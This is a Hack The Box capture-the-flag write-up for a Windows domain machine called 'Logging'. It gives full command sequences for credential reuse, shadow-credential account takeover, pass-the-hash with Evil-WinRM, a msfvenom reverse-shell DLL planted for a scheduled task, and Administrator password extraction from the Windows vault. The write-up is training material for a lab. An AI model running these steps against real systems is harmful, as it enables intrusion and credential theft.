{HackTheBox_Machine_WriteUp}

---

| Machine Name | Logging        |
| ------------ | -------------- |
| OS           | Windows        |
| Difficulty   | Medium         |
| IP Address   | 10.129.245.130 |
| Release Date | 18 APRIL 2026  |
| Pwned Date   | 19 APRIL 2026  |

---

#### Table of Contents 

##### 1. Executive Summary
##### 2. Reconnaissance
   ###### 2.1  Port Scanning
##### 3. Initial Access 
##### 4. Lateral Movement 
##### 5. Privilege Escalation
##### 6. Post-Exploitation 
##### 7. Proof's
##### 8. References


---

#### 1. Executive Summary

This report documents the penetration testing process of the "Logging" machine from Hack The Box.The objective was to identify vulnerabilities and exploit them to achieve full system compromise (user + root). 

We have default credentials with us,from that we found that user svc_recovery has GenericWrite permission on MSA_HEALTH$ user.Investing shares on server leaks the credentials for user svc_recovery that leads to msa_health$ user account takeover.msa_health$ user has a task running on server which will gives us the shell as 'jaylee.clifton' . 

We have got a administrator access but that is not an ideal path which hackthebox was accepting from us,but the technique that we have used in this writeup is also a way to takeover an administrator account.


---

#### 2. Reconnaissance

##### 2.1. Port Scanning

```
sudo nmap -sC -sV -p- 10.129.245.130 --min-rate 3000 -oN nmap_scan_logging
```

Finding :

Open Ports :
53,80,88,135,139,389,445,464,593,636,3268,5985,8530,8531,9389,47001,49664,49665,49666,49667,49673,49695,49696,49700,49715,49753,49791,49798

Domain found : logging.htb and DC01.logging.htb

Default Creds : wallace.everette / Welcome2026@

---

#### 3. Initial Access

I have checked default cred's against smb and ldap that worked.

```
nxc smb 10.129.245.130 -u wallace.everette -p Welcome2026@
nxc ldap 10.129.190.53 -u wallace.everette -p Welcome2026@
```


**SMB SHARE Enumerated** :

```
smbmap -d logging.htb -H 10.129.245.130 -u wallace.everette -p Welcome2026@
```

Found a LOGS share which is not noraml. Checked the share with smbclient and a log file  reveals password for **svc_recover**y user.

For more information, i have collected bloodhound data using bloodhound-python.

```
bloodhound-python -u 'wallace.everette' -p 'Welcome2026@' -d 'logging.htb' -c All --zip -ns 10.129.245.130
```

BloodHound data shows that svc_recovery user has GenericWrite Permission over MSA_HEALTH$ user.
This lead's to account take over of MSA_HEALTH$.Check below steps for more information.

```
### getting tgt ticket for user svc_recovey

impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.245.130

### Using tgt ticket getting hash for user MSA_HEALTH$.

export KRB5CCNAME=svc_recovery.ccache

certipy-ad shadow auto -u 'svc_recovery@logging.htb' -k -account 'msa_health$' -dc-ip 10.129.245.130 -target DC01.logging.htb

```


**NT HASH FOUND :**

Using Evil-WinRM we will get shell on server,but before that we have to match server clock to our machine clock.

```
### Syncing our machine time wrt htb machine.

sudo ntpdate 10.129.245.130

### getting shell

evil-winrm -i 10.129.245.130 -u 'msa_health$' -H '603fc2************85c5'

```


---

#### 4. Lateral Movement

Document folder of this user have a file called monitor.ps1.Code inside that script tells us about a task called UpdateChecker Agent.

I have checked scheduled service on server and found UpdateChekcer Agent their and got location for that task C:\Program Files\UpdateMonitor\ . In that folder their is a file called UpdateMonitor.exe .

Analyzing that exe tell's more about,how that task get handled.We have noticed that the task is looking for a settings_update.dll file inside C:\ProgramData\UpdateMonitor\ folder.DLL file should be in a zip file.So we have to convert that dll file to zip.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.129.245.130 LPORT=4444 -a x86 --platform windows -f dll -o settings_update.dll

zip Settings_Update.zip settings_update.dll

rlwrap nc -lnvp 4444

```

Upload that file to C:\ProgramData\UpdateMonitor\ folder and wait for 3 minute to get shell.

**Shell as user jaylee.clifton gotten.**

**user.txt captured.**

---

#### 5. Privilege Escalation

I have transferred the winPEAS.exe on server and found that windows vault has the Administrator password. HackTricks module  in the reference section will tell you how to extract that password.

```
Import-Module winpeas.ps1
./winpeas.ps1
```

Password Found : Parolapt***********#

We will use that extracted password to get a TGT ticket from server.

```
impacket-getTGT logging.htb/administrator:'password' -dc-ip 10.129.245.130
```

We will use that ticket to get shell as an Administrator.

```
export KRB5CCNAME=administrator.ccache

### check ticket

klist

### nxc smb 10.129.245.130 -u 'administrator' -k --use-kcache -x 'whoami'
```

In command section we can use the revshell for windows and get shell back as an Administrator.

**root.txt captured.**

---

#### 
#### 6. Proof

![](attachment/c1052e0a05e4518e7289e7c83fdc8ff4.png)

![](attachment/2755949b38c6a5618c404d7e167cf035.png)


![](attachment/e8523b9c505c75b82838ae18604408ba.png)

![](attachment/231587bba15974c5565cddbcf0af950d.png)

![](attachment/fea9a27d6ef30e54dae9b91d7cb1d361.png)

![](attachment/aba319e39c526268798c83b5de477df6.png)

![](attachment/2d5883f0bcd37f62d38198553d6f2ba5.png)


![](attachment/2aec21b9c35f49ef943a68f744ca3626.png)

![](attachment/d1664c5c3940843847084b3a7050bf14.png)


![](attachment/8dee703540bd73093098c0cd0825820a.png)

![](attachment/3819da5ccce9cbbe1fdaeb3d5a35aff4.png)

![](attachment/17b0e46b99909e2d5da2abb1d99e264b.png)

![](attachment/c02938c0921ed85127911209f4fa019c.png)

![](attachment/2dc8e906c13fab04387f32962c4bfde6.png)

![](attachment/7fbff67ea3181f2168d309162abda7ea.png)

![](attachment/3ecb4e22027d783076a43c2567ac79c0.png)


![](attachment/c20415145133c772a07db557e5f264d3.png)

![](attachment/8bb1f849fce133ca5905d77ca68cef1f.png)

---

#### 7. References

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html

---

{HackTheBox_Machine_WriteUp}
